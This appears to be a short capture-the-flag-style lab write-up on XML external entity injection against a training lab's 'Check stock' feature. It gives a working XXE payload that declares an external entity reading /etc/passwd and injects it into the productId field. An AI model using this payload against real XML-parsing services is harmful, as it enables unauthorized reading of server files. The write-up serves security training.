# Exploiting XXE to retrieve files

## Lab #1: Exploiting XXE using external entities to retrieve files

> This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
> 
> To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. 

Check stock request has content type of `application/xml`

![d984e097d434d2b44b9eb3bb87076b9f.png](_resources/10347cbe61bf46779e9f37a17a09b6f4.png)

Add custom external entities to read `/etc/passwd` file 

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY passwd SYSTEM "file:///etc/passwd"> ] >
<stockCheck><productId>&passwd;</productId><storeId>1</storeId></stockCheck>
```

Solved

![82f12ccac31c2ccaccb1cfcb2c1e6bf2.png](_resources/f59a20251a894e6d9453162369f88e84.png)



